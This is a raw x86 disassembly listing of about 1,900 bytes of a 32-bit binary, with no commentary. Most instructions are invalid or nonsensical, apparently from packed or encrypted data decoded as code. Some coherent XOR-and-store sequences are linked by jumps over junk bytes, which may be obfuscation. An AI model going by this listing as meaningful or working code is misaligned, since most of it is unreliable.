  401961:	mov    eax,0x112cabdf
  401966:	(bad)  
  401967:	jmp    0x6c28:0xe87edeef
  40196e:	sti    
  40196f:	xor    DWORD PTR [edx+0x64],ebp
  401972:	aam    0x87
  401974:	xor    al,0x56
  401976:	mov    al,ds:0xa0f4cf37
  40197b:	daa    
  40197c:	nop
  40197d:	cdq    
  40197e:	adc    DWORD PTR [eax-0x4df92bb0],0xffffffe7
  401985:	push   edx
  401986:	or     BYTE PTR [edx-0x64],bl
  401989:	call   0xded0b343
  40198e:	mov    bh,0x92
  401990:	or     eax,DWORD PTR [ecx]
  401992:	lods   al,BYTE PTR ds:[esi]
  401993:	and    bl,dl
  401995:	pop    esp
  401996:	cli    
  401997:	add    eax,0x36348be1
  40199c:	(bad)  
  40199d:	int3   
  40199e:	jno    0x401a15
  4019a0:	aad    0xd8
  4019a2:	adc    cl,BYTE PTR ds:0xc5f38d3d
  4019a8:	retf   
  4019a9:	sbb    esi,DWORD PTR [esi+0x13]
  4019ac:	push   edx
  4019ad:	out    0x70,al
  4019af:	sahf   
  4019b0:	loop   0x40197c
  4019b2:	inc    edi
  4019b3:	rol    BYTE PTR [ebx],cl
  4019b5:	xchg   esp,eax
  4019b6:	sti    
  4019b7:	ss jge 0x401999
  4019ba:	call   0xb7735186
  4019bf:	aam    0x9
  4019c1:	mov    dh,0xe7
  4019c3:	js     0x4019d6
  4019c5:	fnsave [ebp+0x37c9a973]
  4019cb:	mov    BYTE PTR [edi+0x6e],bh
  4019ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019cf:	sbb    ebp,edx
  4019d1:	jl     0x4019f9
  4019d3:	std    
  4019d4:	push   ecx
  4019d5:	mov    esp,0xded74ac1
  4019da:	cli    
  4019db:	adc    ah,ch
  4019dd:	mov    ds:0xbfc72215,al
  4019e2:	pop    ds
  4019e3:	pop    es
  4019e4:	(bad)  
  4019e5:	(bad)  
  4019e6:	xchg   esp,eax
  4019e7:	std    
  4019e8:	push   esp
  4019e9:	stc    
  4019ea:	mov    edx,0xade465a0
  4019ef:	pop    ebp
  4019f0:	clc    
  4019f1:	ss popf 
  4019f3:	loope  0x4019dc
  4019f5:	(bad)  
  4019f6:	push   esi
  4019f7:	jp     0x4019ed
  4019f9:	mov    ds:0x882b1cd0,eax
  4019fe:	test   ah,0x41
  401a01:	out    dx,al
  401a02:	rcr    BYTE PTR [ecx-0x75fe600c],cl
  401a08:	push   ss
  401a09:	test   eax,0xc1175a68
  401a0e:	mov    bh,0x10
  401a10:	mov    dl,0x9e
  401a12:	stos   BYTE PTR es:[edi],al
  401a13:	scas   al,BYTE PTR es:[edi]
  401a14:	sub    BYTE PTR [ecx+0x370661d0],0xce
  401a1b:	aas    
  401a1c:	xchg   edx,eax
  401a1d:	cmp    al,0xf2
  401a1f:	and    al,0xcc
  401a21:	out    0x93,eax
  401a23:	into   
  401a24:	sub    ecx,edx
  401a26:	dec    ebx
  401a27:	adc    cl,bl
  401a29:	xchg   ecx,eax
  401a2a:	daa    
  401a2b:	lods   al,BYTE PTR ds:[esi]
  401a2c:	jbe    0x401a35
  401a2e:	pop    ss
  401a2f:	test   eax,0x35ef8036
  401a34:	sub    eax,0xec083ea6
  401a39:	xor    edx,edi
  401a3b:	pushf  
  401a3c:	hlt    
  401a3d:	mov    ?,ebx
  401a3f:	mov    ebx,eax
  401a41:	and    DWORD PTR [edx+0x11],ebx
  401a44:	xor    al,0x76
  401a46:	outs   dx,BYTE PTR ds:[esi]
  401a47:	call   0x698b:0x6a68bdbd
  401a4e:	jmp    0x4019e9
  401a50:	inc    eax
  401a51:	sub    ebx,DWORD PTR [ebx+0x55]
  401a54:	sbb    DWORD PTR [esi],edx
  401a56:	lea    edx,[ebx+0x3c]
  401a59:	sti    
  401a5a:	jp     0x401aa0
  401a5c:	aas    
  401a5d:	mul    DWORD PTR fs:[ebx+0xea327b]
  401a64:	lea    esi,[edi]
  401a66:	inc    edx
  401a67:	xchg   DWORD PTR [ebx+0x57888062],eax
  401a6d:	loop   0x401aca
  401a6f:	dec    ecx
  401a70:	aas    
  401a71:	cmc    
  401a72:	je     0x401a8f
  401a74:	retf   
  401a75:	push   eax
  401a76:	or     DWORD PTR [ecx-0x63164fa3],ecx
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	scas   eax,DWORD PTR es:[edi]
  401a8c:	out    dx,eax
  401a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a8e:	add    ecx,DWORD PTR [esi]
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a1d
  401a98:	fidiv  WORD PTR es:[esp+0x6dc42949]
  401aa0:	(bad)  
  401aa1:	into   
  401aa2:	mov    bh,0x74
  401aa4:	outs   dx,BYTE PTR ds:[esi]
  401aa5:	jae    0x401ab8
  401aa7:	mov    eax,DWORD PTR [ebp-0x2e484cb]
  401aad:	loop   0x401a7a
  401aaf:	and    eax,edi
  401ab1:	inc    edx
  401ab2:	clc    
  401ab3:	jns    0x401abb
  401ab5:	adc    eax,0x5c3e8084
  401aba:	sub    eax,0xcb1634e9
  401abf:	mov    bh,0x85
  401ac1:	adc    esi,DWORD PTR [edi+0x69]
  401ac4:	jo     0x401a4f
  401ac6:	test   al,0x49
  401ac8:	inc    eax
  401ac9:	adc    BYTE PTR [edi-0x6d],dh
  401acc:	aam    0xfe
  401ace:	jne    0x401a90
  401ad0:	and    esp,DWORD PTR ds:0xe2dbf37b
  401ad6:	pop    ebp
  401ad7:	shl    ebx,cl
  401ad9:	fsubp  st(4),st
  401adb:	je     0x401aea
  401add:	call   0x555da726
  401ae2:	cmp    BYTE PTR [ebp+0x34f964d5],ah
  401ae8:	fs gs pop ebp
  401aeb:	xlat   BYTE PTR ds:[ebx]
  401aec:	push   esp
  401aed:	pop    esi
  401aee:	jle    0x401ae8
  401af0:	shl    eax,cl
  401af2:	push   cs
  401af3:	scas   al,BYTE PTR es:[edi]
  401af4:	ins    DWORD PTR es:[edi],dx
  401af5:	mov    edi,0x139804eb
  401afa:	mov    ds:0x46c1cf46,al
  401aff:	or     DWORD PTR [ebx-0x14],edx
  401b02:	pop    esi
  401b03:	cwde   
  401b04:	out    0xdc,al
  401b06:	dec    eax
  401b07:	sbb    ah,0xb8
  401b0a:	aad    0x98
  401b0c:	test   BYTE PTR [edi+ecx*2],bl
  401b0f:	cmp    cl,bl
  401b11:	cdq    
  401b12:	std    
  401b13:	enter  0xef9a,0xf
  401b17:	dec    edi
  401b18:	nop
  401b19:	jns    0x401b0c
  401b1b:	loope  0x401b8f
  401b1d:	icebp  
  401b1e:	adc    al,BYTE PTR [esi]
  401b20:	test   dh,dh
  401b22:	mov    ch,BYTE PTR [edi+0x4282acbd]
  401b28:	mov    WORD PTR [ecx+edx*4],?
  401b2b:	inc    esi
  401b2c:	dec    edx
  401b2d:	cwde   
  401b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b2f:	dec    eax
  401b30:	add    eax,0xd800df29
  401b35:	xchg   DWORD PTR [ebp+0x31468342],edx
  401b3b:	fst    QWORD PTR [edi+ecx*4-0x5b]
  401b3f:	jbe    0x401b6f
  401b41:	push   ebp
  401b42:	push   ss
  401b43:	push   ecx
  401b44:	cmp    ebx,eax
  401b46:	call   0xc561:0x51f90f02
  401b4d:	sbb    al,0xd6
  401b4f:	lods   eax,DWORD PTR es:[esi]
  401b51:	push   es
  401b52:	add    ecx,DWORD PTR [edx]
  401b54:	adc    ebx,DWORD PTR [ebp-0x2b7de776]
  401b5a:	aad    0xc8
  401b5c:	cmp    al,cl
  401b5e:	cli    
  401b5f:	or     DWORD PTR [esi+0x747c9350],esi
  401b65:	push   ecx
  401b66:	inc    ebx
  401b67:	ja     0x401b5a
  401b69:	mov    cl,0x3a
  401b6b:	rcr    DWORD PTR [edi+0x6c],0x84
  401b6f:	nop
  401b70:	sbb    bl,BYTE PTR [esi]
  401b72:	mov    DWORD PTR [eax+0x1602c9d4],eax
  401b78:	pop    esi
  401b79:	repz and bl,ch
  401b7c:	adc    DWORD PTR [ebp-0x5b],edx
  401b7f:	xor    ah,BYTE PTR [edx+ebx*2]
  401b82:	jne    0x401b41
  401b84:	(bad)  
  401b85:	aam    0xda
  401b87:	xor    eax,0x1104e097
  401b8c:	mov    eax,ds:0xc51cb8b
  401b91:	clc    
  401b92:	imul   esp,DWORD PTR [ecx-0x4d],0xffffffd6
  401b96:	rol    DWORD PTR [esi+eax*1+0x675c6ae4],0x87
  401b9e:	jbe    0x401bee
  401ba0:	mov    edi,0x356709fa
  401ba5:	scas   eax,DWORD PTR es:[edi]
  401ba6:	lods   eax,DWORD PTR ds:[esi]
  401ba7:	add    BYTE PTR [ecx-0x34d403e],al
  401bad:	(bad)  
  401bae:	sub    al,0x4e
  401bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bb1:	push   esp
  401bb2:	sub    eax,0xf125fa9a
  401bb7:	xor    DWORD PTR [edi],eax
  401bb9:	push   ebx
  401bba:	cld    
  401bbb:	cld    
  401bbc:	aas    
  401bbd:	sbb    dh,bl
  401bbf:	ror    BYTE PTR [esi],0xba
  401bc2:	fldpi  
  401bc4:	into   
  401bc5:	in     al,0xa0
  401bc7:	pop    es
  401bc8:	jl     0x401be1
  401bca:	in     eax,0x28
  401bcc:	aad    0x1c
  401bce:	scas   al,BYTE PTR es:[edi]
  401bcf:	lds    eax,FWORD PTR [eax-0x59cdc015]
  401bd5:	cmp    al,0x22
  401bd7:	xor    ebp,edx
  401bd9:	mov    eax,ds:0x1ae56369
  401bde:	mov    eax,0xf4a19cde
  401be3:	fsubp  st(7),st
  401be5:	jecxz  0x401c04
  401be7:	mov    ecx,DWORD PTR [eax+esi*1]
  401bea:	inc    edi
  401beb:	aad    0x4a
  401bed:	push   cs
  401bee:	or     ah,BYTE PTR [esi]
  401bf0:	inc    esi
  401bf1:	(bad)
  401bf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bf7:	mov    al,ds:0x845fe6fb
  401bfc:	mov    al,ds:0x940599c8
  401c01:	adc    edi,DWORD PTR [eax]
  401c03:	jae    0x401bf9
  401c05:	xor    ecx,DWORD PTR ds:0xefe80c54
  401c0b:	std    
  401c0c:	dec    ebp
  401c0d:	out    0x6d,al
  401c0f:	sar    BYTE PTR [edi-0x37d7cee9],0x49
  401c16:	fld    QWORD PTR [ebx]
  401c18:	xlat   BYTE PTR ds:[ebx]
  401c19:	fdiv   DWORD PTR [esi]
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	inc    ebp
  401c41:	push   0x798a8956
  401c46:	jle    0x401cc6
  401c48:	cli    
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401ca3
  401c4d:	jp     0x401ccc
  401c4f:	jle    0x401c6c
  401c51:	sub    cl,BYTE PTR [ebp+ebx*8+0x68a85254]
  401c58:	adc    al,0xa7
  401c5a:	jle    0x401bfc
  401c5c:	sbb    ah,ch
  401c5e:	dec    edi
  401c5f:	dec    edi
  401c60:	ja     0x401c5a
  401c62:	shl    bh,0x8
  401c65:	jo     0x401c63
  401c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c68:	icebp  
  401c69:	push   es
  401c6a:	fcmove st,st(3)
  401c6c:	loope  0x401c7d
  401c6e:	outs   dx,BYTE PTR ds:[esi]
  401c6f:	mov    edi,esi
  401c71:	inc    esp
  401c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c73:	out    0x6e,eax
  401c75:	or     bl,bl
  401c77:	cmp    al,0x2
  401c79:	outs   dx,DWORD PTR ds:[esi]
  401c7a:	and    BYTE PTR [esp+ebx*4+0x15],bl
  401c7e:	jo     0x401cad
  401c80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c81:	jmp    0xe207aacb
  401c86:	and    DWORD PTR [edx-0x4c5e4cc0],0xffffffc9
  401c8d:	nop
  401c8e:	or     al,BYTE PTR [esp+ebx*2+0x5f3056f9]
  401c95:	fnstenv [esi-0x7816c561]
  401c9b:	xchg   BYTE PTR [esi+0x6f],dh
  401c9e:	and    dh,BYTE PTR [ecx]
  401ca0:	aam    0x4d
  401ca2:	imul   ah
  401ca4:	pop    eax
  401ca5:	outs   dx,BYTE PTR ds:[esi]
  401ca6:	rcl    DWORD PTR [esi-0x254940d0],1
  401cac:	sbb    DWORD PTR [ecx],edx
  401cae:	ins    DWORD PTR es:[edi],dx
  401caf:	or     DWORD PTR ds:0x97399bfd,esp
  401cb5:	sbb    BYTE PTR [edx+0x52057d7b],ah
  401cbb:	sar    DWORD PTR [eax],1
  401cbd:	push   es
  401cbe:	ja     0x401c48
  401cc0:	and    ebp,DWORD PTR ds:0xd2bbd5b9
  401cc6:	fcom   DWORD PTR [eax+edx*2]
  401cc9:	xchg   edx,eax
  401cca:	pop    ebp
  401ccb:	add    DWORD PTR [ecx+edi*4-0x6b],esi
  401ccf:	inc    edi
  401cd0:	sub    eax,0xce2c8281
  401cd5:	push   edx
  401cd6:	or     eax,0xa2b9b1d9
  401cdb:	xchg   DWORD PTR [ebp+0xe06a6a2],edi
  401ce1:	push   ebx
  401ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ce3:	inc    ecx
  401ce4:	mov    eax,0xd4d5b4e
  401ce9:	cmp    al,0xa
  401ceb:	aad    0xf0
  401ced:	xor    eax,0x67c43f10
  401cf2:	(bad)  
  401cf3:	ret    
  401cf4:	pop    ebx
  401cf5:	in     al,dx
  401cf6:	retf   
  401cf7:	adc    al,0x6f
  401cf9:	push   es
  401cfa:	jmp    0x7713:0x25c5045e
  401d01:	pop    eax
  401d02:	add    cl,BYTE PTR [eax+0x4e]
  401d05:	push   edi
  401d06:	xchg   esi,eax
  401d07:	lods   eax,DWORD PTR ds:[esi]
  401d08:	cwde   
  401d09:	cmp    al,0x19
  401d0b:	jp     0x401cf6
  401d0d:	in     eax,dx
  401d0e:	(bad)  
  401d0f:	or     eax,0x49ee8523
  401d14:	fucomp st(5)
  401d16:	js     0x401d7a
  401d18:	jge    0x401d1f
  401d1a:	jl     0x401d76
  401d1c:	fadd   DWORD PTR [edi-0x5d]
  401d1f:	inc    ecx
  401d20:	or     eax,0x32582eda
  401d25:	cmp    BYTE PTR [edx+0x4904e5e0],cl
  401d2b:	scas   eax,DWORD PTR es:[edi]
  401d2c:	sbb    DWORD PTR [edi-0x582afea6],esi
  401d32:	xchg   DWORD PTR [eax],esp
  401d34:	pop    esi
  401d35:	outs   dx,DWORD PTR ds:[esi]
  401d36:	leave  
  401d37:	xor    eax,0xcea04cf5
  401d3c:	pop    ebp
  401d3d:	and    al,0x31
  401d3f:	inc    ebp
  401d40:	es mov ss,ecx
  401d43:	xor    DWORD PTR [edi-0x16],esi
  401d46:	lahf   
  401d47:	pop    ebp
  401d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d49:	dec    edx
  401d4a:	rcl    DWORD PTR [ecx],0x6
  401d4d:	cli    
  401d4e:	xchg   edx,eax
  401d4f:	sbb    cl,BYTE PTR [edx+ecx*1-0x386c2be9]
  401d56:	retf   
  401d57:	push   esp
  401d58:	or     eax,0xbd7d7226
  401d5d:	mov    WORD PTR [ebx+eiz*8],gs
  401d60:	(bad)  
  401d61:	ror    DWORD PTR [eax+0x64],cl
  401d64:	dec    esp
  401d65:	in     eax,0x80
  401d67:	mov    ebp,0x4560e473
  401d6c:	dec    esp
  401d6d:	ds (bad) 
  401d6f:	(bad)  
  401d70:	mov    bl,0x41
  401d72:	test   BYTE PTR [ecx+0x1f7cbaa7],0x65
  401d79:	mov    ebx,0xa1e59305
  401d7e:	mov    ebp,0x753a9d0b
  401d83:	cld    
  401d84:	adc    BYTE PTR [esi+0x5a],dh
  401d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d88:	jno    0x401d24
  401d8a:	jge    0x401df4
  401d8c:	and    BYTE PTR [ebx+edx*1],bh
  401d8f:	ret    
  401d90:	fsub   st(3),st
  401d92:	loop   0x401d98
  401d94:	pop    eax
  401d95:	pop    ecx
  401d96:	and    al,0x4f
  401d98:	clc    
  401d99:	ins    BYTE PTR es:[edi],dx
  401d9a:	xor    eax,DWORD PTR [ebx+edi*1]
  401d9d:	sbb    eax,0xec655b
  401da2:	and    eax,0x488a1667
  401da7:	les    edi,FWORD PTR [edx]
  401da9:	mov    ebx,0xbfef16d2
  401dae:	inc    edx
  401daf:	aam    0xef
  401db1:	cs ja  0x401db4
  401db4:	or     DWORD PTR [edx+eiz*4+0x1d18fbd3],edi
  401dbb:	icebp  
  401dbc:	mov    esp,0x6938ccb6
  401dc1:	or     BYTE PTR [edx+0x13],bl
  401dc4:	lock jnp 0x401df4
  401dc7:	pop    ecx
  401dc8:	sub    esp,DWORD PTR [ecx]
  401dca:	add    DWORD PTR [ebx-0x4bc5b8e],esp
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x68721c38],ebp
  401e0d:	repnz push ss
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401dbe
  401e17:	push   ecx
  401e18:	ins    BYTE PTR es:[edi],dx
  401e19:	addr16 sbb al,0x23
  401e1c:	jne    0x401dcb
  401e1e:	lahf   
  401e1f:	xor    eax,0x1e0815cb
  401e24:	(bad)  [ecx]
  401e26:	(bad)  
  401e27:	test   eax,0xe452bfcb
  401e2c:	shl    BYTE PTR [ebx-0x28b96a04],1
  401e32:	repz pop ss
  401e34:	pop    ds
  401e35:	sbb    BYTE PTR [edi+0x3e],dh
  401e38:	mov    bl,0x91
  401e3a:	push   ebp
  401e3b:	shl    ebx,1
  401e3d:	scas   al,BYTE PTR es:[edi]
  401e3e:	mov    ds:0xda809043,eax
  401e43:	aam    0xbf
  401e45:	ret    
  401e46:	mov    eax,ds:0x7c3caa69
  401e4b:	pusha  
  401e4c:	and    ch,al
  401e4e:	ds out 0x33,al
  401e51:	popa   
  401e52:	ret    0x44b
  401e55:	push   edi
  401e56:	jl     0x401e90
  401e58:	xchg   edi,eax
  401e59:	iret   
  401e5a:	sub    edi,DWORD PTR [eax]
  401e5c:	retf   
  401e5d:	xor    BYTE PTR [ebx-0x1a0c3a77],bl
  401e63:	or     al,BYTE PTR [ebx+0x28]
  401e66:	sbb    cl,BYTE PTR ds:0x5efbd5b
  401e6c:	sub    dh,al
  401e6e:	cmp    bh,BYTE PTR [esi+esi*4-0x652d806a]
  401e75:	outs   dx,DWORD PTR es:[esi]
  401e77:	adc    BYTE PTR [eax+ebp*1],dh
  401e7a:	adc    esp,DWORD PTR [ebx+0x32]
  401e7d:	sub    edx,ecx
  401e7f:	aad    0xea
  401e81:	mov    esi,0xb79a5d4d
  401e86:	into   
  401e87:	js     0x401ec2
  401e89:	inc    edx
  401e8a:	mov    bh,0x20
  401e8c:	retf   
  401e8d:	int3   
  401e8e:	push   ebp
  401e8f:	mov    eax,0x73147b58
  401e94:	inc    esp
  401e95:	xlat   BYTE PTR ds:[ebx]
  401e96:	leave  
  401e97:	test   BYTE PTR ds:0x5d1d0402,0x74
  401e9e:	cld    
  401e9f:	jnp    0x401e2d
  401ea1:	inc    ecx
  401ea2:	mov    dh,0xad
  401ea4:	xor    edi,DWORD PTR [ebx-0x69d6342e]
  401eaa:	cdq    
  401eab:	in     al,dx
  401eac:	outs   dx,BYTE PTR ds:[esi]
  401eae:	ror    BYTE PTR [eax],cl
  401eb0:	pop    ss
  401eb1:	aaa    
  401eb2:	pop    esi
  401eb3:	icebp  
  401eb4:	adc    DWORD PTR [ebx-0x2c867f80],0xffffffbb
  401ebb:	in     eax,dx
  401ebc:	frstor [eax-0x1758b7ec]
  401ec2:	bswap  ecx
  401ec4:	xchg   edx,ebp
  401ec6:	add    al,0x94
  401ec8:	sahf   
  401ec9:	out    0xc5,al
  401ecb:	inc    ebp
  401ecc:	push   0x3e
  401ece:	xor    BYTE PTR [ecx+edi*4+0x49],dh
  401ed2:	scas   eax,DWORD PTR es:[edi]
  401ed3:	(bad)  
  401ed4:	and    al,0x49
  401ed6:	dec    eax
  401ed7:	enter  0x9026,0x50
  401edb:	fisubr WORD PTR [edx-0x210789c3]
  401ee1:	and    DWORD PTR [ebx],edx
  401ee3:	loope  0x401e94
  401ee5:	in     eax,0xb2
  401ee7:	(bad)  
  401ee9:	pusha  
  401eea:	jb     0x401f1b
  401eec:	test   BYTE PTR [ebx+0x13],0x89
  401ef0:	outs   dx,BYTE PTR ds:[esi]
  401ef1:	imul   eax,DWORD PTR [ecx+eax*8-0x62d963fa],0x938b6092
  401efc:	rcl    DWORD PTR [ecx+0x53],1
  401eff:	adc    al,0x3a
  401f01:	scas   eax,DWORD PTR es:[edi]
  401f02:	pushf  
  401f03:	loope  0x401f84
  401f05:	sbb    ch,al
  401f07:	add    BYTE PTR [ecx+edi*4+0x67],bh
  401f0b:	ficom  DWORD PTR [edi]
  401f0d:	gs jmp 0x4d05e2de
  401f13:	jo     0x401f89
  401f15:	jmp    0x401efe
  401f17:	xor    DWORD PTR [eax*4-0x5cf88b2],esp
  401f1e:	sub    eax,0x3cb0a263
  401f23:	mov    dl,ch
  401f25:	xor    ah,BYTE PTR [ecx+0x4]
  401f28:	mov    ebx,0xeb7e88a9
  401f2d:	enter  0xe7bf,0xbc
  401f31:	mov    edi,ebx
  401f33:	xchg   esp,eax
  401f34:	mov    ah,0xa0
  401f36:	add    BYTE PTR [edi-0x280c437f],ah
  401f3c:	sub    BYTE PTR ds:0xb2b8fb85,0xb9
  401f43:	add    eax,0x3279d601
  401f48:	enter  0x182d,0xc5
  401f4c:	jmp    0x7397:0x68c4bf39
  401f53:	lods   eax,DWORD PTR ds:[esi]
  401f54:	push   ebx
  401f55:	popf   
  401f56:	fcom   QWORD PTR [ebp-0x1c57bd7c]
  401f5c:	or     ch,BYTE PTR [edi+0x9bcd86b]
  401f62:	clc    
  401f63:	xchg   esp,eax
  401f64:	int3   
  401f65:	sbb    eax,0x4bd3eebe
  401f6a:	inc    esi
  401f6c:	mov    dh,0xbd
  401f6e:	or     ch,dl
  401f70:	mov    al,0x94
  401f72:	jg     0x401f93
  401f74:	xchg   ebx,eax
  401f75:	jo     0x401fae
  401f77:	clc    
  401f78:	sbb    edx,DWORD PTR [eax-0x20dffe18]
  401f7e:	or     al,0xff
  401f80:	data16 lock loopne 0x401fad
  401f84:	sub    al,0x69
  401f86:	and    al,0xa9
  401f88:	add    esp,DWORD PTR [edi+eiz*4]
  401f8b:	or     al,0xb9
  401f8d:	lods   al,BYTE PTR ds:[esi]
  401f8e:	call   ecx
  401f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f91:	xlat   BYTE PTR ds:[ebx]
  401f92:	shr    BYTE PTR [eax],1
  401f94:	cdq    
  401f95:	cli    
  401f96:	sub    DWORD PTR ds:0x840ffc09,eax
  401f9c:	ins    DWORD PTR es:[edi],dx
  401f9d:	add    eax,DWORD PTR [eax]
  401f9f:	add    BYTE PTR [ebp-0x977b],cl
  401fa5:	call   DWORD PTR [eax-0x75]
  401fa8:	inc    ebp
  401fa9:	in     al,0x33
  401fab:	mov    BYTE PTR [ebx],0xc7
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x6c180ee4
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401fa8
  401fcc:	mov    ecx,0x57ea1112
  401fd1:	shl    BYTE PTR [ebx+0xa1780e4],cl
  401fd7:	pop    ebp
  401fd8:	sbb    dh,BYTE PTR [ecx+edi*8+0x3dbb2e61]
  401fdf:	sbb    al,0x4b
  401fe1:	rcr    eax,cl
  401fe3:	outs   dx,DWORD PTR ds:[esi]
  401fe4:	xor    al,0xf3
  401fe6:	add    dh,BYTE PTR fs:[esi-0x39]
  401fea:	test   BYTE PTR [eax],0x19
  401fed:	aaa    
  401fee:	jmp    0x56fd91b0
  401ff3:	imul   esi,DWORD PTR [eax+0x64],0xa7cb1589
  401ffa:	ret    
  401ffb:	mov    bh,0x5d
  401ffd:	call   0x7ee6c6e6
  402002:	sub    BYTE PTR [edx+0x36],0xe8
  402006:	xchg   DWORD PTR [ebx],esp
  402008:	test   BYTE PTR [ebp+0x7e],bh
  40200b:	pop    edx
  40200c:	lea    ebx,[ebx-0x57208a8b]
  402012:	push   ss
  402013:	int3   
  402014:	jmp    0x402002
  402016:	in     al,0xe
  402018:	inc    edi
  402019:	xchg   edi,eax
  40201a:	fidivr DWORD PTR [edx-0x22]
  40201d:	xor    BYTE PTR [esi],0x43
  402020:	in     al,dx
  402021:	mov    ch,ah
  402023:	int    0x8f
  402025:	xchg   edx,eax
  402026:	inc    edx
  402027:	sub    eax,0xe82bc865
  40202c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40202d:	mov    dl,0x96
  40202f:	mov    ds:0x733e63f,eax
  402034:	xchg   ebp,eax
  402035:	pop    esi
  402036:	int3   
  402037:	cmp    bl,BYTE PTR ds:0x166f5132
  40203d:	xchg   ebp,eax
  40203e:	jmp    0xd1c0:0xc56e6c0b
  402045:	add    DWORD PTR [esi],esi
  402047:	jae    0x4020a2
  402049:	out    0xc3,al
  40204b:	xchg   edx,eax
  40204c:	data16 (bad) 
  40204e:	leave  
  40204f:	leave  
  402050:	or     ah,dh
  402052:	int3   
  402053:	cmp    BYTE PTR [edi],0xa
  402056:	out    0xbd,eax
  402058:	and    al,0x35
  40205a:	pushf  
  40205b:	int3   
  40205c:	xor    ebp,DWORD PTR [ebp-0x5672a4ad]
  402062:	push   edx
  402063:	lds    esp,FWORD PTR [edx+0x4c7cebe3]
  402069:	sbb    ebx,DWORD PTR [ecx]
  40206b:	push   edx
  40206c:	dec    esi
  40206d:	push   0x58e056c2
  402072:	push   es
  402073:	cmp    esp,edx
  402075:	fldcw  WORD PTR [edx]
  402077:	loopne 0x4020f3
  402079:	or     esp,DWORD PTR [edi+0x4edd6b6c]
  40207f:	cmp    esi,DWORD PTR [ebx]
  402081:	jl     0x4020a7
  402083:	mov    bl,BYTE PTR [eax-0x2e]
  402086:	sbb    DWORD PTR [eax],eax
  402088:	mov    cl,0x19
  40208a:	add    ebx,DWORD PTR [eax+0x11dab4b0]
  402090:	andps  xmm4,XMMWORD PTR [edi-0x5cfa9ae4]
  402097:	pop    ss
  402098:	inc    esi
  402099:	mov    es,WORD PTR [edx]
  40209b:	mov    ch,0x26
  40209d:	loop   0x402064
  40209f:	mov    WORD PTR [ebx-0x24],?
  4020a2:	jnp    0x4020a0
  4020a4:	inc    edx
  4020a5:	into   
  4020a6:	cmp    esi,DWORD PTR [ebx-0x37]
  4020a9:	(bad)  
  4020aa:	call   0xcad:0x79e381d0
  4020b1:	jmp    0x402046
  4020b3:	imul   DWORD PTR [edi]
  4020b5:	ret    
  4020b6:	sub    DWORD PTR [edi],edx
  4020b8:	in     al,0xdb
  4020ba:	xor    ecx,ecx
  4020bc:	mov    cl,0xe1
  4020be:	mov    ebp,0xe86534cc
  4020c3:	mov    ebp,DWORD PTR [ebx+0x69]
  4020c6:	pop    ebx
  4020c7:	add    BYTE PTR [edx-0x52],ah
  4020ca:	sti    
  4020cb:	xor    al,0x44
  4020cd:	rsqrtps xmm4,XMMWORD PTR ds:0xcfd8c626
  4020d4:	loopne 0x402116
  4020d6:	mov    esi,0xb8221ba2
  4020db:	mov    esi,0xfdf75aae
  4020e0:	sar    edx,1
  4020e2:	in     eax,dx
  4020e3:	neg    ecx
  4020e5:	xchg   ecx,eax
  4020e6:	cli    
  4020e7:	shl    DWORD PTR [ecx],cl
  4020e9:	daa    
  4020ea:	leave  
  4020eb:	xor    esp,eax
  4020ed:	repz and bh,dh
  4020f0:	pusha  
  4020f1:	or     eax,0x2b84150a
